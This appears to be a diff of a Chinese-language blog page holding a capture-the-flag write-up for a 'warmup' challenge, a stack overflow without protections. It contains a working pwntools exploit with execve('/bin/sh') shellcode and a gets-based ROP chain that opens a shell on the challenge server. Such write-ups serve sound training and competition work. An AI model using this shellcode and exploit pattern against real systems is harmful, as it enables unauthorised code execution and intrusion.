@@ -44,7 +44,7 @@
         
 <div class="nav" id="nav">
     <div class="avatar-name">
-        <div class="avatar radius">
+        <div class="avatar ">
             <img src="/img/avatar.jpg" />
         </div>
         <div class="name">
@@ -137,7 +137,7 @@
 </span>
 </span>
     </div>
-    <div class="post-content ">
+    <div class="post-content no-indent">
         <p>tcl 做了三道签到题目</p>
 <h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>没有任何保护的栈溢出</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x0000000000601A00</span></span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x00007FFE0740F240</span></span><br><span class="line">ret=<span class="number">0x00007FFE0740F348</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process('./pwn')</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io=remote(<span class="string">'nothing.chal.ctf.westerns.tokyo'</span>,<span class="number">10001</span>)</span><br><span class="line">io.sendline((ret-buf)*<span class="string">'a'</span>+p64(<span class="number">0x0000000000400773</span>)+p64(addr)+p64(elf.plt[<span class="string">'gets'</span>])+p64(addr))</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
